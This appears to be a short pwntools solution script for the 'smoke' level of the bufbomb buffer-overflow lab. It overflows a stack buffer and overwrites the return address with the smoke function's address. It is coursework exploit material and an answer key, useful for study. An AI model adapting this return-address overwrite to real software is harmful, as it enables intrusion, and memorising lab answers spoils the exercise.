from pwn import *

binary = context.binary = ELF('./bufbomb')

p = process(['./bufbomb','-u','IxZ'])



payload = b'A'*(0x28+4)

payload += p32(binary.sym.smoke)

f = open('solve.txt','wb')
f.write(payload)


p.sendline(payload)

p.interactive()

